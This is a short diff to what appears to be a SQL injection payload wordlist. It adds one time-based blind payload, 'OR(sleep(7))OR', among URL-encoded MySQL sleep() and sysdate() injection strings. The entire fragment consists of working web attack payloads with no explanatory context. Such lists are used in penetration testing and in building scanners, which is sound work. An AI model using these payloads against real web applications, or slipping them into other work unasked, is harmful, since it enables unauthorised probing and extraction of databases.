@@ -43,6 +43,7 @@ if(now()=sysdate()%2Csleep(8)%2C0)
 %2b(select*from(select(sleep(6)))a)%2b
 0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
 0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z
+OR(sleep(7))OR
 
 MySQL Blind
 
